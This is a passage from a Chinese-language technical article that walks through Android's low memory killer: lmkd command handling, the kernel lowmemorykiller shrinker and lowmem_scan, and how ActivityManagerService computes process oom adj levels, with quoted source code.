LMK_TARGET, /* Associate minfree with oom_adj_score */ LMK_PROCPRIO, /* Register a process and set its oom_adj_score */ LMK_PROCREMOVE, /* Unregister a process */ }; 其中 LMK_TARGET 用于更新系统 oom_adj，framework 发出该 command 的方法是 PorcessList.updateOomLevels ();LMK_PROCPRIO 用于更新进程 adj，framework 发出该 command 的方法是 PorcessList.setOomAdj ()；LMK_PROCPRIO 用于移除进程，framework 发出该 command 的方法是 PorcessList.remove ()。 # 6.1 cmd_target 方法 从 ProcessList.java 中得知在 ProcessList 构造时会初始化一次，另外会在 ATMS.updateConfiguration 是会触发： frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java 123456789101112public boolean updateConfiguration(Configuration values) { mAmInternal.enforceCallingPermission(CHANGE_CONFIGURATION, &quot;updateConfiguration()&quot;); synchronized (mGlobalLock) { ... mH.sendMessage(PooledLambda.obtainMessage( ActivityManagerInternal::updateOomLevelsForDisplay, mAmInternal, DEFAULT_DISPLAY)); ... }} 最终会调用到 ProcessList.updateOomLevels () frameworks/base/servcies/core/java/com/android/server/am/ProcessList.java 123456789101112131415private void updateOomLevels(int displayWidth, int displayHeight, boolean write) { ... if (write) { ByteBuffer buf = ByteBuffer.allocate(4 * (2 * mOomAdj.length + 1)); buf.putInt(LMK_TARGET); for (int i = 0; i &lt; mOomAdj.length; i++) { buf.putInt((mOomMinFree[i] * 1024)/PAGE_SIZE); buf.putInt(mOomAdj[i]); } writeLmkd(buf, null); ... }} 系统通过这个函数计算 oom adj 的 minfree，并将各个级别的 minfree 和 oom_adj_score 传入到 lmkd 中，继续跟进 lmkd 的 cmd_target： 123456789101112131415161718192021222324252627282930313233static void cmd_target(int ntargets, int *params) { int i; if (ntargets &gt; (int)ARRAY_SIZE(lowmem_adj)) return; //将framework传过来的参数保存到lowmem_minfree和lowmem_adj数组中 for (i = 0; i &lt; ntargets; i++) { lowmem_minfree[i] = ntohl(*params++); lowmem_adj[i] = ntohl(*params++); } lowmem_targets_size = ntargets; if (use_inkernel_interface) { char minfreestr[128]; char killpriostr[128]; //根据lowmwm_minfree和lowmwm_adj中的数值，构造出数值字符串 minfreestr[0] = '\\0'; killpriostr[0] = '\\0'; for (i = 0; i &lt; lowmem_targets_size; i++) { char val[40]; if (i) { strlcat(minfreestr, &quot;,&quot;, sizeof(minfreestr)); strlcat(killpriostr, &quot;,&quot;, sizeof(killpriostr)); } snprintf(val, sizeof(val), &quot;%d&quot;, lowmem_minfree[i]); strlcat(minfreestr, val, sizeof(minfreestr)); snprintf(val, sizeof(val), &quot;%d&quot;, lowmem_adj[i]); strlcat(killpriostr, val, sizeof(killpriostr)); } //将上面循环中构造出来的字符串数值写入到/sys/moudle/lowmwmoryykiller/parameters/adj writefilestring(INKERNEL_MINFREE_PATH, minfreestr); //将上面循环中构造出来的另一字符串数值写入到/sys/modlue/lowmemorykiller/parameters/adj writefilestring(INKERNEL_ADJ_PATH, killpriostr); }} cmd_target () 函数的目的就是将 framework 传过来的数值记录到数组中，即将 minfreestr 和 killpriostr 然后将这两个数组拼接成字符串输入，然后写入到内核对应的位置。 # 6.2 cmd_procprio 方法 1234567891011121314151617181920212223242526272829303132333435363738static void cmd_procprio(int pid, int uid, int oomadj) { struct proc *procp; char path[80]; char val[20]; //判断oomadj的值是否在规定值内 if (oomadj &lt; OOM_DISABLE || oomadj &gt; OOM_ADJUST_MAX) { ALOGE(&quot;Invalid PROCPRIO oomadj argument %d&quot;, oomadj); return; } //根据进程的pid输出对应的路径 snprintf(path, sizeof(path), &quot;/proc/%d/oom_score_adj&quot;, pid);snprintf(val, sizeof(val), &quot;%d&quot;, lowmem_oom_adj_to_oom_score_adj(oomadj));//将oomadj的值写入到对应进程的oom_score_adj中writefilestring(path, val);//使用内核接口就直接返回//这里use_inkernel_interface在初始化的时候设置为1，所以这里直接return if (use_inkernel_interface) return; //判断是否有记录到对应的proc结构 procp = pid_lookup(pid);if (!procp) { //如果没有对应的proc结构，表明该进程是新创建的，需要新分配一个结构proc结构记录该进程 procp = malloc(sizeof(struct proc)); if (!procp) { // Oh, the irony. May need to rebuild our state. return; } procp-&gt;pid = pid; procp-&gt;uid = uid; procp-&gt;oomadj = oomadj; proc_insert(procp);} else { //如果之前已经有proc记录，那么就更新对应的数值 proc_unslot(procp); procp-&gt;oomadj = oomadj; proc_slot(procp); }} 因为现在使用的是内核接口，所以只需要将 oomadj 的数值写入到 /proc/[pid]/oom_source_adj 中即可起到更新进程的 oomadj 的效果。接下来分析 command 处理方法 cmd_procremove 方法。 # 6.3 cmd_procremove 方法 12345678910111213141516171819202122232425static void cmd_procremove(int pid) { //如果使用内核接口直接返回 if (use_inkernel_interface) return; pid_remove(pid); kill_lasttime = 0;}//如果不使用内核接口的话，就需要更新链表的信息，并删除proc结构占用的内存static int pid_remove(int pid) { int hval = pid_hashfn(pid); struct proc *procp; struct proc *prevp; for (procp = pidhash[hval], prevp = NULL; procp &amp;&amp; procp-&gt;pid != pid; procp = procp-&gt;pidhash_next) prevp = procp; if (!procp) return -1; if (!prevp) pidhash[hval] = procp-&gt;pidhash_next; else prevp-&gt;pidhash_next = procp-&gt;pidhash_next; proc_unslot(procp); free(procp); return 0;} 如果未使用内核接口则调用 pid_remove 进行移除工作。 整理如下： lmkd.c 对应方法 执行动作 LMK_PROCPRIO cmd_procprio 写 /proc/oom_score_adj LMK_TARGET cmd_target 写 /sys/moudle/lowmemorykiller/parameters/minfree 写 /sys/module/lowmemorykiller/parameters/adj LMK_PROCREMOVE cmd_procremove 删除 /proc/ # 7. mp_event_common # （四） lowermemorykiller.c # 1. LMK 的驱动加载函数 12345static int __init lowmem_init(void){ register_shrinker(&amp;lowmem_shrinker); return 0;} init 方法中注册了一个 shrinker 到内核的 shrinker 链表。当内存不足时，kswapd 线程会遍历一张 shrinker 链表，并回调已注册的 shrinker 函数来回收内存 page，kswapd 还会周期性唤醒来执行内存操作。每个 zone 维护 active_list 和 inactive_list 链表，内核根据页面活动状态将 page 在这两个链表之间移动，最终通过 shrink_slab 和 shrink_zone 来回收内存页。 # 2. 数据结构 12345678910111213static short lowmem_adj[6] = { 0, 1, 6, 12,};static int lowmem_adj_size = 4;static int lowmem_minfree[6] = { 3 * 512, /* 6MB */ 2 * 1024, /* 8MB */ 4 * 1024, /* 16MB */ 16 * 1024, /* 64MB */}; 第一个数组 lowmem_adj 最多有 6 个元素（默认只定义了 4 个），它表示可用内存容量处于 “某层级” 时需要被处理的 adj 值；第二个数组则是对 “层级” 的描述。举个例子，lowmwm_minfree 的第一个元素是 3512，即 3512*lowmwm_adj_size=6MB。也就是说，当可用内存小于 6MB 时，Killer 需要清理 adj 值为 0（即 lowmem_adj 的第一个元素）以下的所有进程。其中 adj 的取值范围是 - 17～15，数字越小表示进程级别越高（通常只有 0～15 被使用）。 lowmem_adj 和 lowmem_adj_size 这两个数组只是系统的预定义值，我们还可以根据项目的实际需求来做定制。Android 系统提供了相应的文件来供我们修改这两组值，路径如下： 12/sys/module/lowmemorykiller/parameters/adj/sys/module/lowmemorykiller/parameters/minfree 也可以在 init.rc 中加入语句 12write /sys/module/lowmemorykiller/parameters/adj 0,8write /sys/module/lowmemorykiller/parameters/minfree 1024,4096 # 3. Adj 进程规划 ADJ Description UNKNOW_ADJ 一般指将要会缓存进程，无法获取确定值 HIDDEN_APP_MAX_ADJ=15 当前只运行了不可见的 Activity 组件的进程，分别为不可见进程 adj 的最大值、最小值 HIDDEN_APP_MIN_ADJ=9 SERVICE_B_ADJ=8 B list of Service。和 A list 相比，它们对用户的黏合度要小一些 PREVIOUS_APP_ADJ=7 用户前一次交互的进程。按照用户的使用习惯，人们经常会在几个常用进程间切换，所以这类进程得到再次运行的概率比较大 HOME_APP_ADJ=6 Home 进程 SERVICE_ADJ=5 当前运行了 application service 的进程 BACKUP_APP_ADJ=4 用于承载 backup 相关操作的进程 HEAVY_WEIGHT_APP_ADJ=3 重量级应用程序进程 PERCEPTIBLE_APP_ADJ=2 这类进程能被用户感觉到不可见，如后台运行的音乐播放器 VISIBLE_APP_ADJ=1 有前台可见的 Activity 的进程，如果轻易杀死这类进程将严重影响用户的体验。 FOREGROUND_APP_ADJ=0 当前正在前台运行的进程，也就是用户正在交互的那个程序 PERSISTENT_PROC_ADJ=-12 Persistent 性质的进程，如 telephony SYSTEM_ADJ=-16 系统进程 NATIVE_ADJ=-17 native 进程（不被系统管理） 通过以下方法，我们可以自己改变进程的 oom_adj 值： # 3.1 写文件 和前面的 adj 和 minfree 类似，进程的 oom_adj 也可以通过写文件的形式修改，路径为 /proc//oom_adj。比如 init.rc 中就有如下语句： 12on early-init write /proc/1/oom_adj-16 PID 值为 1 的进程是 init 程序，这里将此进程的 adj 改为 - 16，以保证它不会被杀死。 # 3.2 android: persistent 对于某些非常重要的应用程序，我们不希望它们被系统杀死。一个最简单的方法就是在它的 AndroidManifest.xml 文件中给 “application” 标签添加 “android:persistent==true” 属性。不过将应用程序设置为常驻内存要特别慎重，如果应用程序本身不够完善，而系统又不能通过支持方式回收它的话，则有可能导致意想不到的问题。 # 4. lowmem_shrinker 结构体 12345static struct shrinker lowmem_shrinker = { .scan_objects = lowmem_scan, .count_objects = lowmem_count, .seeks = DEFAULT_SEEKS * 16}; # 4.1 lowmem_scan 方法 当系统内存不足时会回调 lowmem_scan 方法来 kill 应用以达到释放内存的效果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117static unsigned long lowmem_scan(struct shrinker *s, struct shrink_control *sc){ struct task_struct *tsk; struct task_struct *selected = NULL; unsigned long rem = 0; int tasksize; int i; short min_score_adj = OOM_SCORE_ADJ_MAX + 1; int minfree = 0; int selected_tasksize = 0; short selected_oom_score_adj; int array_size = ARRAY_SIZE(lowmem_adj); int other_free = global_page_state(NR_FREE_PAGES) - totalreserve_pages; int other_file = global_page_state(NR_FILE_PAGES) - global_page_state(NR_SHMEM) - total_swapcache_pages(); //获取数组大小 if (lowmem_adj_size &lt; array_size) array_size = lowmem_adj_size; if (lowmem_minfree_size &lt; array_size) array_size = lowmem_minfree_size; //获取当前内存阈值对应的adj值 for (i = 0; i &lt; array_size; i++) { minfree = lowmem_minfree[i]; if (other_free &lt; minfree &amp;&amp; other_file &lt; minfree) { min_score_adj = lowmem_adj[i]; break; } } lowmem_print(3, &quot;lowmem_scan %lu, %x, ofree %d %d, ma %hd\\n&quot;, sc-&gt;nr_to_scan, sc-&gt;gfp_mask, other_free, other_file, min_score_adj); //如果当前min_score_adj为最大adj值加1，表明还剩余足够的内存，不需要进行内存释放 if (min_score_adj == OOM_SCORE_ADJ_MAX + 1) { lowmem_print(5, &quot;lowmem_scan %lu, %x, return 0\\n&quot;, sc-&gt;nr_to_scan, sc-&gt;gfp_mask); return 0; } selected_oom_score_adj = min_score_adj; rcu_read_lock(); //遍历所有的进程task for_each_process(tsk) { struct task_struct *p; short oom_score_adj; if (tsk-&gt;flags &amp; PF_KTHREAD) continue; p = find_lock_task_mm(tsk); if (!p) continue; //如果进程已经不包含任何memory则跳过 if (test_tsk_thread_flag(p, TIF_MEMDIE) &amp;&amp; time_before_eq(jiffies, lowmem_deathpending_timeout)) { task_unlock(p); rcu_read_unlock(); return 0; } //如果当前进程的oom_score_adj比当前内存阈值的adj还小，表明当前进程不应该被杀，跳过 oom_score_adj = p-&gt;signal-&gt;oom_score_adj; if (oom_score_adj &lt; min_score_adj) { task_unlock(p); continue; } //如果当前进程的oom_score_adj比当前内存阈值的adj值大，进入进程的被杀候选 //首先获取当前进程的占用内存大小 tasksize = get_mm_rss(p-&gt;mm); task_unlock(p); if (tasksize &lt;= 0) continue; //如果已经有进程被选为被杀进程 if (selected) { //如果当前进程的oom_score_adj值比之前挑选的进程的oom_score_adj值小 //代表当前进程重要程度比选中要杀的进程高，则跳过 if (oom_score_adj &lt; selected_oom_score_adj) continue; //如果oom_score_adj值一样大，但是进程占用内存比选中要杀的进程小也跳过 if (oom_score_adj == selected_oom_score_adj &amp;&amp; tasksize &lt;= selected_tasksize) continue; } //以上判断都不符合，表明当前进程的oom_score_adj值比挑选要杀的进程的oom_score_adj大 //更新被挑选要杀的进程为当前遍历的进程，并记录相关信息后进入下一轮循环 selected = p; selected_tasksize = tasksize; selected_oom_score_adj = oom_score_adj; lowmem_print(2, &quot;select '%s' (%d), adj %hd, size %d, to kill\\n&quot;, p-&gt;comm, p-&gt;pid, oom_score_adj, tasksize); } //如果找到需要被杀进程 if (selected) { //计算能够释放的内存大小 long cache_size = other_file * (long)(PAGE_SIZE / 1024); long cache_limit = minfree * (long)(PAGE_SIZE / 1024); long free = other_free * (long)(PAGE_SIZE / 1024); trace_lowmemory_kill(selected, cache_size, cache_limit, free); lowmem_print(1, &quot;Killing '%s' (%d), adj %hd,\\n&quot; \\ &quot; to free %ldkB on behalf of '%s' (%d) because\\n&quot; \\ &quot; cache %ldkB is below limit %ldkB for oom_score_adj %hd\\n&quot; \\ &quot; Free memory is %ldkB above reserved\\n&quot;, selected-&gt;comm, selected-&gt;pid, selected_oom_score_adj, selected_tasksize * (long)(PAGE_SIZE / 1024), current-&gt;comm, current-&gt;pid, cache_size, cache_limit, min_score_adj, free); lowmem_deathpending_timeout = jiffies + HZ; set_tsk_thread_flag(selected, TIF_MEMDIE); //发送SIGKILL信号到被选中进程 send_sig(SIGKILL, selected, 0); //统计释放内存大小 rem += selected_tasksize; } lowmem_print(4, &quot;lowmem_scan %lu, %x, return %lu\\n&quot;, sc-&gt;nr_to_scan, sc-&gt;gfp_mask, rem); rcu_read_unlock(); return rem;} lowmem_scan 方法的主要思想就是首先获取当前内存剩余量，根据剩余量获取对应的 min free adj 值；接着遍历当前系统中的所有进程，从中挑选出进程的 oom adj 最大者，如果存在进程 oom adj 值相同，则挑选出其中占用内存最大的那个进程；最后向这个进程发送 SIGKILL 信息，以达到杀死该进程释放内存的效果。 # 4.2 lowmem_count 方法 12345678static unsigned long lowmem_count(struct shrinker *s, struct shrink_control *sc){ return global_page_state(NR_ACTIVE_ANON) + global_page_state(NR_ACTIVE_FILE) + global_page_state(NR_INACTIVE_ANON) + global_page_state(NR_INACTIVE_FILE);} lowmem_count 方法就是通过 shrinker 链表来判断 lmk 是否可用，如果可用则返回各部分占用的内存大小。 # 5. 整体流程 # 四、oom adj 算法 Android 进程在不同的时候处于不同的进程状态，也会根据重要性动态调整进程的 oom score。这样在 lmkd 中可以根据当前的内存使用情况，找到合适的 oom_score_adj，并将其 kill 以满足内存的持续使用。 下面主要分析 oom adj 算法作为 lmkd 机制的补充 Android 系统中计算各进程 adj 算法的核心方法 updateOomAdjLocked：更新 adj，当目标进程为空或者被杀则返回 false；否则返回 true computeOomAdjLocked：计算 adj，返回计算后 RawAdj 值 appOomAdjLocked：应用 adj，当需要杀掉目标进程则返回 false；否则返回 true ​ 当 Android 四大组件状态改变时会 updataOomAdjLocked () 来同步更新相应进程的 ADJ 优先级。这里需要说明一下，当同一个进程有多个决定其优先级的组件状态时，取优先级最高的 ADJ 最为最终的 ADJ。另外，进程会通过设置 maxAdj 来限定 ADJ 的上限。关于分析进程 ADJ 相关信息，常用命令如下： dumpsys meminfo dumpsys activity o dumpsys activity p # 1. ADJ &lt; 0 的进程 NATIVE_ADJ (-1000)：是由 init 进程 fork 出来的 Native 进程，并不受 system 管控； SYSTEM_ADJ (-900)：是指 system_server 进程； PERSISTENT_PROC_ADJ (-800): 是指在 AndroidManifest.xml 中声明 android:persistent=”true” 的系统 (即带有 FLAG_SYSTEM 标记) 进程，persistent 进程一般情况并不会被杀，即便被杀或者发生 Crash 系统会立即重新拉起该进程。 PERSISTENT_SERVICE_ADJ (-700)：是由 startIsolatedProcess () 方式启动的进程，或者是由 system_server 或者 persistent 进程所绑定 (并且带有 BIND_ABOVE_CLIENT 或者 BIND_IMPORTANT) 的服务进程 BACKUP_APP_ADJ (300)：执行 bindBackupAgent () 过程的进程 HEAVY_WEIGHT_APP_ADJ (400): realStartActivityLocked () 过程，当应用的 privateFlags 标识 PRIVATE_FLAG_CANT_SAVE_STATE 的进程； HOME_APP_ADJ (600)：当类型为 ACTIVITY_TYPE_HOME 的应用，比如桌面 APP PREVIOUS_APP_ADJ (700)：用户上一个使用的 APP 进程 # 1.1 SYSTEM_ADJ(-900) SYSTEM_ADJ: 仅指 system_server 进程。在执行 SystemServer 的 startBootstrapServices () 过程会调用 AMS.setSystemProcess ()，将 system_server 进程的 maxAdj 设置成 SYSTEM_ADJ，源码如下： 12345678910111213141516171819public void setSystemProcess() { ... ApplicationInfo info = mContext.getPackageManager().getApplicationInfo( &quot;android&quot;, STOCK_PM_FLAGS | MATCH_SYSTEM_ONLY); mSystemThread.installSystemApplicationInfo(info, getClass().getClassLoader()); synchronized (this) { ProcessRecord app = newProcessRecordLocked(info, info.processName, false, 0); app.persistent = true; app.pid = MY_PID; app.maxAdj = ProcessList.SYSTEM_ADJ; app.makeActive(mSystemThread.getApplicationThread(), mProcessStats); synchronized (mPidsSelfLocked) { mPidsSelfLocked.put(app.pid, app); } updateLruProcessLocked(app, false, null); updateOomAdjLocked(); } ...} # 1.2 PERSISTENT_PROC_ADJ(-800) PERSISTENT_PROC_ADJ：在 AndroidManifest.xml 中申明 android:persistent=”true” 的系统 (即带有 FLAG_SYSTEM 标记) 进程，称之为 persistent 进程。对于 persistent 进程常规情况都不会被杀，一旦被杀或者发生 Crash，进程会立即重启。 场景一：newProcessRecordLocked 1234567891011121314151617final ProcessRecord newProcessRecordLocked(ApplicationInfo info, String customProcess, boolean isolated, int isolatedUid) { String proc = customProcess != null ? customProcess : info.processName; final int userId = UserHandle.getUserId(info.uid); int uid = info.uid; ... final ProcessRecord r = new ProcessRecord(stats, info, proc, uid); if (!mBooted &amp;&amp; !mBooting &amp;&amp; userId == UserHandle.USER_SYSTEM &amp;&amp; (info.flags &amp; PERSISTENT_MASK) == PERSISTENT_MASK) { r.persistent = true; r.maxAdj = ProcessList.PERSISTENT_PROC_ADJ; } if (isolated &amp;&amp; isolatedUid != 0) { r.maxAdj = ProcessList.PERSISTENT_SERVICE_ADJ; } return r;} 场景二： addAppLocked 123456789101112131415161718192021222324252627final ProcessRecord addAppLocked(ApplicationInfo info, String customProcess, boolean isolated, String abiOverride) { ProcessRecord app; if (!isolated) { app = getProcessRecordLocked(customProcess != null ? customProcess : info.processName, info.uid, true); } else { app = null; } if (app == null) { app = newProcessRecordLocked(info, customProcess, isolated, 0); updateLruProcessLocked(app, false, null); updateOomAdjLocked(); } ... if ((info.flags &amp; PERSISTENT_MASK) == PERSISTENT_MASK) { app.persistent = true; app.maxAdj = ProcessList.PERSISTENT_PROC_ADJ; } if (app.thread == null &amp;&amp; mPersistentStartingProcesses.indexOf(app) &lt; 0) { mPersistentStartingProcesses.add(app); startProcessLocked(app, &quot;added application&quot;, customProcess != null ? customProcess : app.processName, abiOverride); } return app;} # 1.3 PERSISTENT_SERVICE_ADJ(-700) PERSISTENT_SERVICE_ADJ: startIsolatedProcess () 方式启动的进程，或者是由 system_server 或者 persistent 进程所绑定的服务进程。 场景一： newProcessRecordLocked 1234567891011121314151617final ProcessRecord newProcessRecordLocked(ApplicationInfo info, String customProcess, boolean isolated, int isolatedUid) { String proc = customProcess != null ? customProcess : info.processName; final int userId = UserHandle.getUserId(info.uid); int uid = info.uid; ... final ProcessRecord r = new ProcessRecord(stats, info, proc, uid); if (!mBooted &amp;&amp; !mBooting &amp;&amp; userId == UserHandle.USER_SYSTEM &amp;&amp; (info.flags &amp; PERSISTENT_MASK) == PERSISTENT_MASK) { r.persistent = true; r.maxAdj = ProcessList.PERSISTENT_PROC_ADJ; } if (isolated &amp;&amp; isolatedUid != 0) { //startIsolatedProcess r.maxAdj = ProcessList.PERSISTENT_SERVICE_ADJ; } return r;} 调用链如下： 1234567891011startOtherServices WebViewUpdateService.prepareWebViewInSystemServer WebViewUpdateServiceImpl.prepareWebViewInSystemServer WebViewUpdater.prepareWebViewInSystemServer WebViewUpdater.onWebViewProviderChanged SystemImpl.onWebViewProviderChanged WebViewFactory.onWebViewProviderChanged WebViewLibraryLoader.prepareNativeLibraries WebViewLibraryLoader.createRelros WebViewLibraryLoader.createRelroFile AMS.startIsolatedProcess # 1.4 BACKUP_APP_ADL(300) 1234567891011121314if (mBackupTarget != null &amp;&amp; app == mBackupTarget.app) { if (adj &gt; ProcessList.BACKUP_APP_ADJ) { adj = ProcessList.BACKUP_APP_ADJ; if (procState &gt; ActivityManager.PROCESS_STATE_TRANSIENT_BACKGROUND) { procState = ActivityManager.PROCESS_STATE_TRANSIENT_BACKGROUND; } app.adjType = &quot;backup&quot;; app.cached = false; } if (procState &gt; ActivityManager.PROCESS_STATE_BACKUP) { procState = ActivityManager.PROCESS_STATE_BACKUP; app.adjType = &quot;backup&quot;; }} 执行 bindBackupAgent () 过程，设置 mBackupTarget 值； 执行 clearPendingBackup () 或 unbindBackupAgent () 过程，置空 mBackupTarget 值； # 1.5 HEAVY_WEIGHT_APP_ADJ(400) realStartActivityLocked () 过程，当应用的 privateFlags 标识 PRIVATE_FLAG_CANT_SAVE_STATE，设置 mHeavyWeightProcess 值； finishHeavyWeightApp (), 置空 mHeavyWeightProcess 值； # 1.6 HOME_APP_ADJ(600) 当类型为 ACTIVITY_TYPE_HOME 的应用启动后会设置 mHomeProcess, 比如桌面 APP # 1.7 PREVIOUS_APP_ADJ(700) 场景 1： 用户上一个使用的包含 UI 的进程，为了给用户在两个 APP 之间更好的切换体验，将上一个进程 ADJ 设置到 PREVOUS_APP_ADJ 的档次。当 activityStoppedLocked () 过程会更新上一个应用 123456789101112if (app == mPreviousProcess &amp;&amp; app.activities.size() &gt; 0) { if (adj &gt; ProcessList.PREVIOUS_APP_ADJ) { adj = ProcessList.PREVIOUS_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_BACKGROUND; app.cached = false; app.adjType = &quot;previous&quot;; } if (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) { procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY; app.adjType = &quot;previous&quot;; }} 场景 2： 当 provider 进程，上一次使用时间不超过 20S 的情况下，优先级不低于 PREVIOUS_APP_ADJ。provider 进程这个是 Android 7.0 以后新增的逻辑 ，这样做的好处是在内存比较低的情况下避免拥有 provider 的进程出现颠簸，也就是启动后杀，然后又被拉。 12345678910111213if (app.lastProviderTime &gt; 0 &amp;&amp; (app.lastProviderTime+mConstants.CONTENT_PROVIDER_RETAIN_TIME) &gt; now) { if (adj &gt; ProcessList.PREVIOUS_APP_ADJ) { adj = ProcessList.PREVIOUS_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_BACKGROUND; app.cached = false; app.adjType = &quot;recent-provider&quot;; } if (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) { procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY; app.adjType = &quot;recent-provider&quot;; }} # 2. FOREGROUND_APP_ADJ(0) 场景 1：满足以下任一条件的进程都属于 FOREGROUND_APP_ADJ (0) 优先级： 正处于 resumed 状态的 Activity 正执行一个生命周期回调的 Service（比如执行 onCreate,onStartCommand,onDestroy 等） 正执行 onReceive () 的 BroadcastReceiver 通过 startInstrumentation () 启动的进程 12345678910111213141516171819202122232425262728293031323334353637if (PROCESS_STATE_CUR_TOP == ActivityManager.PROCESS_STATE_TOP &amp;&amp; app == TOP_APP) { adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_TOP_APP; app.adjType = &quot;top-activity&quot;; foregroundActivities = true; procState = PROCESS_STATE_CUR_TOP;} else if (app.instr != null) { adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_DEFAULT; app.adjType = &quot;instrumentation&quot;; procState = ActivityManager.PROCESS_STATE_FOREGROUND_SERVICE;} else if (isReceivingBroadcastLocked(app, mTmpBroadcastQueue)) { adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = (mTmpBroadcastQueue.contains(mFgBroadcastQueue)) ? ProcessList.SCHED_GROUP_DEFAULT : ProcessList.SCHED_GROUP_BACKGROUND; app.adjType = &quot;broadcast&quot;; procState = ActivityManager.PROCESS_STATE_RECEIVER;} else if (app.executingServices.size() &gt; 0) { adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = app.execServicesFg ? ProcessList.SCHED_GROUP_DEFAULT : ProcessList.SCHED_GROUP_BACKGROUND; app.adjType = &quot;exec-service&quot;; procState = ActivityManager.PROCESS_STATE_SERVICE;} else if (app == TOP_APP) { adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_BACKGROUND; app.adjType = &quot;top-sleeping&quot;; foregroundActivities = true; procState = PROCESS_STATE_CUR_TOP;} else { schedGroup = ProcessList.SCHED_GROUP_BACKGROUND; adj = cachedAdj; procState = ActivityManager.PROCESS_STATE_CACHED_EMPTY; app.cached = true; app.empty = true; app.adjType = &quot;cch-empty&quot;;} 场景 2： 当客户端进程 activity 里面调用 bindService () 方法时 flags 带有 BIND_ADJUST_WITH_ACTIVITY 参数，并且该 activity 处于可见状态，则当前服务进程也属于前台进程，源码如下 1234567891011121314151617181920212223242526272829303132333435for (int is = app.services.size()-1; is &gt;= 0; is--) { ServiceRecord s = app.services.valueAt(is); for (int conni = s.connections.size()-1; conni &gt;= 0; conni--) { ArrayList&lt;ConnectionRecord&gt; clist = s.connections.valueAt(conni); for (int i = 0; i &lt; clist.size(); i++) { ConnectionRecord cr = clist.get(i); if ((cr.flags&amp;Context.BIND_WAIVE_PRIORITY) == 0) { ... } final ActivityRecord a = cr.activity; if ((cr.flags&amp;Context.BIND_ADJUST_WITH_ACTIVITY) != 0) { if (a != null &amp;&amp; adj &gt; ProcessList.FOREGROUND_APP_ADJ &amp;&amp; (a.visible || a.state == ActivityState.RESUMED || a.state == ActivityState.PAUSING)) { adj = ProcessList.FOREGROUND_APP_ADJ; if ((cr.flags&amp;Context.BIND_NOT_FOREGROUND) == 0) { if ((cr.flags&amp;Context.BIND_IMPORTANT) != 0) { schedGroup = ProcessList.SCHED_GROUP_TOP_APP_BOUND; } else { schedGroup = ProcessList.SCHED_GROUP_DEFAULT; } } app.cached = false; app.adjType = &quot;service&quot;; app.adjTypeCode = ActivityManager.RunningAppProcessInfo .REASON_SERVICE_IN_USE; app.adjSource = a; app.adjSourceProcState = procState; app.adjTarget = s.name; } } } }} 场景 3： 对于 provider 客户端进程，还有以下两个条件能成为前台进程： 当 Provider 的客户端进程 ADJ&lt;=FOREGROUND_APP_ADJ 时，则 Provider 进程 ADJ 等于 FOREGROUND_APP_ADJ 当 Provider 有外部 (非框架) 进程依赖，也就是调用了 getContentProviderExternal () 方法，则 ADJ 至少等于 FOREGROUND_APP_ADJ 12345678910111213141516171819202122232425262728293031for (int provi = app.pubProviders.size()-1; provi &gt;= 0; provi--) { ContentProviderRecord cpr = app.pubProviders.valueAt(provi); //根据client来调整provider进程的adj和procState for (int i = cpr.connections.size()-1; i &gt;= 0; i--) { ContentProviderConnection conn = cpr.connections.get(i); ProcessRecord client = conn.client; int clientAdj = computeOomAdjLocked(client, cachedAdj, TOP_APP, doingAll, now); if (adj &gt; clientAdj) { if (app.hasShownUi &amp;&amp; app != mHomeProcess &amp;&amp; clientAdj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) { ... } else { adj = clientAdj &gt; ProcessList.FOREGROUND_APP_ADJ ? clientAdj : ProcessList.FOREGROUND_APP_ADJ; adjType = &quot;provider&quot;; } app.cached &amp;= client.cached; } ... } //根据provider外部依赖情况来调整adj和schedGroup if (cpr.hasExternalProcessHandles()) { if (adj &gt; ProcessList.FOREGROUND_APP_ADJ) { adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_DEFAULT; app.cached = false; app.adjType = &quot;ext-provider&quot;; app.adjTarget = cpr.name; } }} # 3. VISIBLE_APP_ADJ(100) 可见进程：当 ActivityRecord 的 visible=true，也就是 Activity 可见的进程。 1234567891011121314151617181920212223242526272829303132if (!foregroundActivities &amp;&amp; activitiesSize &gt; 0) { int minLayer = ProcessList.VISIBLE_APP_LAYER_MAX; for (int j = 0; j &lt; activitiesSize; j++) { final ActivityRecord r = app.activities.get(j); if (r.visible) { if (adj &gt; ProcessList.VISIBLE_APP_ADJ) { adj = ProcessList.VISIBLE_APP_ADJ; app.adjType = &quot;vis-activity&quot;; } if (procState &gt; PROCESS_STATE_CUR_TOP) { procState = PROCESS_STATE_CUR_TOP; app.adjType = &quot;vis-activity&quot;; } schedGroup = ProcessList.SCHED_GROUP_DEFAULT; app.cached = false; app.empty = false; foregroundActivities = true; final TaskRecord task = r.getTask(); if (task != null &amp;&amp; minLayer &gt; 0) { final int layer = task.mLayerRank; if (layer &gt;= 0 &amp;&amp; minLayer &gt; layer) { minLayer = layer; } } break; } ... } if (adj == ProcessList.VISIBLE_APP_ADJ) { adj += minLayer; }} 从 Android P 开始，进一步细化 ADJ 级别，增加了 VISIBLE_APP_LAYER_MAX (99)，是指 VISIBLE_APP_ADJ (100) 跟 PERCEPTIBLE_APP_ADJ (200) 之间有 99 个槽，则可见级别 ADJ 的取值范围为 [100,199]。 算法会根据其所在 task 的 mLayerRank 来调整其 ADJ，100 加上 mLayerRank 就等于目标 ADJ，layer 越大，则 ADJ 越小。 当 TaskRecord 顶部的 ActivityRecord 为空或者结束或者不可见时，则设置该 TaskRecord 的 mLayerRank 等于 - 1; 每个 ActivityDisplay 的 baseLayer 都是从 0 开始，从最上面的 TaskRecord 开始，第一个 ADJ=100，从上至下依次加 1，直到 199 为上限。 # 4. PERCEPTIBLE_APP_ADJ(200) 